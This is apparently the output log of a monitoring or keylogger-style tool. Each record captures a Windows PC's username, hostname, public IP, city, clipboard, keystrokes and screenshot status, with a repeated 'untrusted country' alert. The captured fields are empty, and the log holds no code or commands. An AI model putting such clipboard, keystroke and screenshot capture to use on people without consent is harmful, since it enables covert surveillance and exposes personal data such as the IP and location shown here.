{"timestamp": "2025-05-12T10:32:11.140612", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "2e105dc92a11551744d0478e1053926beb528404b2905ccec401fde10824271b", "log_hash": "a67b272493ea8d4c50276445091004d760a04b58d91447f4c9a861bafc572d94"}
{"timestamp": "2025-05-12T10:32:37.443504", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "263196d9b1dbdb4ad1011cc76e0457404bce7846857991aaa592bdb1b793fe97", "log_hash": "cd1b42c6f364738b849aba76c16d59eeba1a3416879bdee68c4b05a432731a11"}
{"timestamp": "2025-05-12T10:33:03.871771", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "dc6a12dbc92b0a9d547255f5e0a42b04d7c18c75bab84eeaec0edb8ad838264c", "log_hash": "f1f20263ca71172278f8a29728cc1e83e19436eca89be0d14411adfa50aad8df"}
{"timestamp": "2025-05-13T13:01:47.851326", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "3179c26ace55b265735df71241a87127ee0eb9ba1905fb92bd011b9dd6b59b90", "log_hash": "fcf69bf58e578f6f3c842cd266b14966668490be46ded40f308536dcea2fe399"}
{"timestamp": "2025-05-13T13:02:15.131146", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "58e80743e7c8e03c7505fcd76df2a8c2a580d4f853c12fd4053a3dd511b5cf5f", "log_hash": "62587528cf419f53e7093ba439903aa9321bed91a9587eb92b400b6538a2a90a"}
{"timestamp": "2025-05-13T13:02:41.700023", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "d98660daa58542d369feb62fcecbfdcf7091da4bd4b996fd4b64d9a64da570d7", "log_hash": "7e7a278f5b31044423f88795053f8d5c9996b9c2c0e25a7113ce73cb2f420ec5"}
{"timestamp": "2025-05-13T13:03:08.115986", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "0e90a33c9d0e6bf34a17260acf337ee77dc7f06606e196472acf4568af59ec8b", "log_hash": "d3cd6f5be82bd220908bef87dd5a7c11a8d6fdc6a37a90a37469cee75c56ab5d"}
{"timestamp": "2025-05-13T13:03:34.440708", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "9284b1bb4cac4b5138fbb1ca0c7943edaa7e2fa2840877b3c8a8bf101fdb756b", "log_hash": "ac347048744c485b844fd317ce5967a48f06d8dfdf5ebb6160af561f67896b35"}
{"timestamp": "2025-05-13T13:04:00.944488", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "3e504227e315b8d5ce98259e6f7d105fdca58b58bc586a7c2e45a1c2ed0beccb", "log_hash": "94b2943eb8c08d302d69da798f751a40a955cd857e24c7579722227f37d4fb25"}
{"timestamp": "2025-05-13T13:04:27.507208", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "3f99cbfb1711e618cf7fdb238430399fdb556c04754bccb6849bf2fdbad19917", "log_hash": "def836ae8a1471916038013301096c1d148b488277d5016585ea6aca2656bff5"}
{"timestamp": "2025-05-13T13:04:54.050689", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "7a05d8434c514fbf2b17236b72165dd1346ae6ed20b8ffb94e744e4eedeae6c2", "log_hash": "c939a3ac9f63073841f2ce4fc9e25a8f20a0eb90e9e5802c952b38246f786a1b"}
{"timestamp": "2025-05-13T13:05:20.501693", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "80d858b287423c5cfdaebbbd2ba244c433be4cb5f04e34f084ba31f56beb502c", "log_hash": "da9b4c7e8dc57adfc8ceaac9ac8ac94ce97eec182a555cc6b4f78680fe432dbd"}
{"timestamp": "2025-05-13T13:05:46.694134", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "de3f137bd01595a1845cbbdfd9429f6e811b506abd1bc31ea3bc502c14d8805b", "log_hash": "0d2141c41f163c5dba0c90c3e12bcd6f3c4ba8f5ae7d4ac6a6ec7d67bb0d2bc8"}
{"timestamp": "2025-05-13T13:06:13.241786", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "d0d4077f552dc9984215607702bd9ca08c46a2b57ef1f9d36e79141685ddc387", "log_hash": "a32844c1c9fd475cbc3718942ecb059e484290bb85380b32f30b1ebc66b237ea"}
{"timestamp": "2025-05-13T13:06:39.689547", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "ebacde3ed1dee7383bb463546f1b81c41b547c40ff4e2ef7eea4aa4749968f89", "log_hash": "b2fa4a18953504ee03f3cf8e1bae4d73c3ffd9389d9e78e493e471628c76a7e1"}
{"timestamp": "2025-05-13T13:07:06.218164", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "199f9786aa36a2a8c5d028b9161010b1983e8b13759add549a54db0ab250697e", "log_hash": "7fa3c3c60f6357ed581612a4f97a47c408aa4f0dec6861d04d95e2e169f1ee9e"}
{"timestamp": "2025-05-13T13:07:32.435035", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "c11269aacf25d060b9f9ae230edd6ce20908ebd70c2a31c052aa377bcf8bb40d", "log_hash": "b93b53bf105dcda3c2c9298af8eef2f1ee725010f28f1dfaf7bc80e8934d581d"}
{"timestamp": "2025-05-13T13:07:59.133726", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "bd2fa2100453b655461a9d6185d392f929b494a3be95940dce7f44f305842b3b", "log_hash": "118545268c5b57bfbfbc8981eeae5d5820b4aa2a79f99b7c296ceb903d2042c4"}
{"timestamp": "2025-05-13T13:08:25.622784", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "2d7ec744f5a0fb741d0fe7d84e4f3c7a9dd911ce3cf7fcfdfc4767aae9346d62", "log_hash": "697a9e8eed98f14237bd75b2d7de18a64907de7c34bbd11a85678a1f84f775f8"}
{"timestamp": "2025-05-13T13:08:52.137131", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "ad854e44e0880b40b6d1c6eee0a88a6b3ae4ef33db70125ff22348406bc2434f", "log_hash": "9d5f0912001f8848e5b0eb2c768780e7c69216f53501d1809ed7eb0d050a3a50"}
{"timestamp": "2025-05-13T13:09:18.621462", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "f8c2d4e91969ab37cb7e2c2fbf5dbdfcbde6c5edaf06f9ccc9b205f47718bd30", "log_hash": "4399be3e504dff105ffbaefbd8baec1195219fb4e29f5a2228f46ba79e34e088"}
{"timestamp": "2025-05-13T13:09:45.053435", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "432d3e200ddce7d9f26e309f46c236ba123de13d446011b8cf78e667f2b5e72b", "log_hash": "41bc648fd3c3953d0dc1c489f9fa7f77a9860e5caee67c1773bb0c398059f8b4"}
{"timestamp": "2025-05-13T13:10:11.482891", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "bb15a17568290070e2f43838cd8607d22c015744fb3b5d63aeab6f0aad5be437", "log_hash": "4056164f468c521360445a0f834935ddbedee97e120030962714704814b49833"}
{"timestamp": "2025-05-13T13:10:37.913692", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "e69b641706f879816bf949b1dd5f9b4579833a2ab202e3459fa0b7c8b9c0df1d", "log_hash": "d8909ed721d46bcbd18aec5e461ecfd4d2b9b26e1da3d4bce9aa0ea01fe93b14"}
{"timestamp": "2025-05-13T13:11:04.348639", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "f1b30ee7b84a77f61f1b2f8bf10d8d9ed2d35d870c254c2590df3209b6764f82", "log_hash": "d52a96b21a3c10de27cddfaf76fe140ac2a134c00a6be4fae47ca1581656acbd"}
{"timestamp": "2025-05-13T13:11:30.828255", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "3db3616c6da8c2ae1dfe64bfa56499ff6b4089a13e3b3d001df497227707c8da", "log_hash": "312a598f9b6f4aed91156eeca3c4cc3fa7923e565b3e94880eaa6cab2d1199a6"}
{"timestamp": "2025-05-13T13:11:57.014447", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "a6e28050429357b1f6f4b67c363a689addae1f873493af2fd074662ebe593f2e", "log_hash": "d473b0083dc9ef6040719749ee1829b9477f509b54b0511081e5bfd0229c6a69"}
{"timestamp": "2025-05-13T13:12:23.732003", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "83e5d62d16422ddad7fcfa877f362f1062f7102b05dd95ad7e595ea143ef1a76", "log_hash": "c7e1ffd91f0d32bdd3793830a4ff78d7b62bb9b6672159bc1869ae794330aa4a"}
{"timestamp": "2025-05-13T13:12:50.424773", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "13916df371a193e1d1a9913156a6608fd7d161836662080c112e17d81becdccb", "log_hash": "38e3e370dd7f2df11e1b05af78272d6021379a1d08b706833fae72a19f49d0cd"}
{"timestamp": "2025-05-13T13:13:16.817694", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "9248b7a7aad54c87c933cc68a3e0e73d46c91f1ec4d25f20b440af0e8e3d383b", "log_hash": "c8bca9dcc0945af86111749f298bdfd03c23c8c37cc5679805776e2c07e92a53"}
{"timestamp": "2025-05-13T13:13:43.378535", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "fd26428d23bd575ae09929c409f23a334130ffcf3afd2b702884292566182c37", "log_hash": "77a2574e57ab2df86edb2d74a4d44ca2c9257300280a612d8df745e070ba9701"}
{"timestamp": "2025-05-13T13:14:09.910803", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "edfe1b60bf4c1979dd1b8bdb35797c8297c1964117fc49b6bf429b2a06da7323", "log_hash": "29d6bc17f57c2c485583b941ab0bddbc62d63983f5d0489d6d652211ea9d066e"}
{"timestamp": "2025-05-13T13:14:36.497627", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "b8b45743cddaf4470bea7d95178fb52c3ab21494523d9eeaf58b61ddb851767a", "log_hash": "0045f344490f86f3535931d2b691427bb0a71c807d39e566e9944e87e82e460e"}
{"timestamp": "2025-05-13T13:15:03.048165", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "e358f10e638ef4e26bb4ed827888db6b40d6ae34ebf4ae5c4de14aeadd8f72c0", "log_hash": "435fa78359c8d9cc82a5f06f5d2c287fe6e899d0795ae72a3a8cb35ee582730f"}
{"timestamp": "2025-05-13T13:15:30.464784", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "2e2a0533a52e225e35a2387dd1b11718a7c3668ff6bbce4965043b2d2067d519", "log_hash": "5dd7f4c1022030ecccdd7e854201d308e6bfa28bc299cf085634256418a294fe"}
{"timestamp": "2025-05-13T13:15:56.798495", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "c0cc8837befe45e4335c89df88c06ccbaa47334df26594ee23c6b447593fd829", "log_hash": "8e0cfe0c16140dbdaeafa697ed2227ddd8ea2315846997e666eec9c1ce4c5d90"}
{"timestamp": "2025-05-13T13:16:23.170656", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "5bfd6183e1dded6e78b4e32d0492bb9416d07bc8e8fc1d80b30b062e6f59eb49", "log_hash": "f8d84f9d1fc70f741b05a416b5d31a48f914edf37f37263205800d0b0f67493b"}
{"timestamp": "2025-05-13T13:16:49.754263", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "eeaf639c1782ec3f03a9ae7f0f7047f9c743f11c4370d497ef863b791b7863f3", "log_hash": "bdae4f2c503e07e486e4439fb9c4e407e69a9839328eb0562cc22b5a2d798361"}
{"timestamp": "2025-05-13T13:17:16.229019", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "654d1cf427c9183e43cbdeede20097bdf93732f27144c33459eafe72151f9614", "log_hash": "3fa84ba5d194abd95ae3e882807270dca47333e48db13cb42277bf1db1413276"}
